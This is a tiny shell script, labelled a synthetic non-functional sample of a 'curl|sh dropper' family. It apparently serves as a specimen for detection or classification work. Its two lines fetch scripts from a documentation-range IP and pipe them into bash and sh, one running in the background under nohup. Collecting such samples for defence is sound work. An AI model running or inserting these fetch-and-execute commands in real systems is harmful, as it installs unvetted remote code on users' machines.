#!/bin/sh
# Synthetic sample - pipe-to-shell dropper from raw IP (NON-FUNCTIONAL, doc IP)
# Family: curl|sh dropper
curl -s http://192.0.2.77/install.sh | bash
nohup wget -qO- http://192.0.2.77/x | sh &
